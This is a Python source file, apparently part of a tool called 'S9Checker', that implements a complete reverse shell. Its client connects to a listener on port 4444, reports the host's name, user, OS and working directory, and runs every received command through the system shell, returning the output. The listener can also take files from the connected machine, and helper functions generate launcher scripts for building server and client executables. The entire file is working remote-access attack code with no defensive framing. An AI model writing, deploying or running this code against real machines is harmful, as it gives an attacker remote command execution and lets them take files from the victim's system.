
import os
import sys
import json
import socket
import subprocess
import threading
import time
import logging
from typing import Optional
from dataclasses import dataclass

logger = logging.getLogger("S9Checker")


@dataclass
class ShellConfig:
    host: str = "0.0.0.0"
    port: int = 4444
    buffer_size: int = 4096
    timeout: int = 10


class ReverseShellServer:

    def __init__(self, config: ShellConfig):
        self.config = config
        self.server_socket: Optional[socket.socket] = None
        self.client_socket: Optional[socket.socket] = None
        self.client_address: Optional[tuple] = None
        self._running = False
        self._output_callback = None

    def set_output_callback(self, callback):
        self._output_callback = callback

    def _emit(self, text: str, is_error: bool = False):
        if self._output_callback:
            self._output_callback(text, is_error)
        else:
            prefix = "[ERROR] " if is_error else ""
            print(f"{prefix}{text}")

    def start(self):
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.config.host, self.config.port))
            self.server_socket.listen(1)
            self.server_socket.settimeout(1.0)

            self._running = True
            self._emit(f"Server listening on {self.config.host}:{self.config.port}")
            self._emit("Waiting for client connection...")

            while self._running:
                try:
                    self.client_socket, self.client_address = self.server_socket.accept()
                    self._emit(f"Client connected from {self.client_address[0]}:{self.client_address[1]}")
                    self._handle_client()
                except socket.timeout:
                    continue
                except Exception as e:
                    if self._running:
                        self._emit(f"Accept error: {e}", is_error=True)

        except Exception as e:
            self._emit(f"Server error: {e}", is_error=True)
        finally:
            self.stop()

    def _handle_client(self):
        self.client_socket.settimeout(1.0)

        while self._running and self.client_socket:
            try:
                data = self.client_socket.recv(self.config.buffer_size)
                if not data:
                    self._emit("Client disconnected")
                    break

                response = data.decode("utf-8", errors="replace")

                if response.startswith("[FILE:"):
                    self._handle_file_recv(response)
                else:
                    self._emit(response)

            except socket.timeout:
                continue
            except ConnectionResetError:
                self._emit("Connection reset by client")
                break
            except Exception as e:
                if self._running:
                    self._emit(f"Receive error: {e}", is_error=True)
                break

        self.client_socket = None

    def _handle_file_recv(self, data: str):
        try:
            header_end = data.find("]")
            header = data[6:header_end]
            filename, size = header.split("|")

            content_start = header_end + 1
            content = data[content_start:]

            with open(filename, "wb") as f:
                f.write(content.encode("utf-8", errors="replace"))

            self._emit(f"File received: {filename} ({size} bytes)")
        except Exception as e:
            self._emit(f"File receive error: {e}", is_error=True)

    def send_command(self, command: str) -> bool:
        if not self.client_socket:
            self._emit("No client connected", is_error=True)
            return False

        try:
            self.client_socket.send(command.encode("utf-8"))
            return True
        except Exception as e:
            self._emit(f"Send error: {e}", is_error=True)
            return False

    def stop(self):
        self._running = False
        if self.client_socket:
            try:
                self.client_socket.close()
            except Exception:
                pass
        if self.server_socket:
            try:
                self.server_socket.close()
            except Exception:
                pass
        self._emit("Server stopped")


class ReverseShellClient:

    def __init__(self, config: ShellConfig):
        self.config = config
        self.socket: Optional[socket.socket] = None
        self._running = False

    def start(self):
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(1.0)

            print(f"Connecting to {self.config.host}:{self.config.port}...")
            self.socket.connect((self.config.host, self.config.port))
            self._running = True
            print("Connected!")

            info = {
                "hostname": os.environ.get("COMPUTERNAME", "unknown"),
                "username": os.environ.get("USERNAME", "unknown"),
                "os": sys.platform,
                "cwd": os.getcwd()
            }
            self.socket.send(json.dumps(info).encode("utf-8"))

            while self._running:
                try:
                    data = self.socket.recv(self.config.buffer_size)
                    if not data:
                        break

                    command = data.decode("utf-8", errors="replace").strip()

                    if not command:
                        continue

                    if command.lower() == "exit":
                        self._running = False
                        break

                    if command.lower().startswith("cd "):
                        path = command[3:].strip()
                        try:
                            os.chdir(path)
                            response = f"Changed directory to: {os.getcwd()}"
                        except Exception as e:
                            response = f"cd error: {e}"
                        self.socket.send(response.encode("utf-8"))
                        continue

                    if command.lower() == "pwd":
                        self.socket.send(os.getcwd().encode("utf-8"))
                        continue

                    result = subprocess.run(
                        command,
                        shell=True,
                        capture_output=True,
                        text=True,
                        timeout=30
                    )

                    output = result.stdout + result.stderr
                    if not output:
                        output = "(no output)"

                    self.socket.send(output.encode("utf-8", errors="replace"))

                except socket.timeout:
                    continue
                except subprocess.TimeoutExpired:
                    self.socket.send(b"Command timed out")
                except Exception as e:
                    self.socket.send(f"Error: {e}".encode("utf-8"))

        except ConnectionRefusedError:
            print("Connection refused. Is the server running?")
        except Exception as e:
            print(f"Client error: {e}")
        finally:
            self.stop()

    def stop(self):
        self._running = False
        if self.socket:
            try:
                self.socket.close()
            except Exception:
                pass


def build_server_exe(output_name: str = "server.exe"):
    code = '''import sys
import os

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from core.reverseshell import ReverseShellServer, ShellConfig

def main():
    import argparse
    parser = argparse.ArgumentParser(description="S9Checker Reverse Shell Server")
    parser.add_argument("--host", default="0.0.0.0", help="Host to listen on")
    parser.add_argument("--port", type=int, default=4444, help="Port to listen on")
    args = parser.parse_args()

    config = ShellConfig(host=args.host, port=args.port)
    server = ReverseShellServer(config)
    
    try:
        server.start()
    except KeyboardInterrupt:
        print("\\nShutting down...")
        server.stop()

if __name__ == "__main__":
    main()
'''
    return code


def build_client_exe(output_name: str = "client.exe"):
    code = '''import sys
import os

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from core.reverseshell import ReverseShellClient, ShellConfig

def main():
    import argparse
    parser = argparse.ArgumentParser(description="S9Checker Reverse Shell Client")
    parser.add_argument("--host", required=True, help="Server IP address")
    parser.add_argument("--port", type=int, default=4444, help="Server port")
    args = parser.parse_args()

    config = ShellConfig(host=args.host, port=args.port)
    client = ReverseShellClient(config)
    
    try:
        client.start()
    except KeyboardInterrupt:
        print("\\nDisconnecting...")
        client.stop()

if __name__ == "__main__":
    main()
'''
    return code
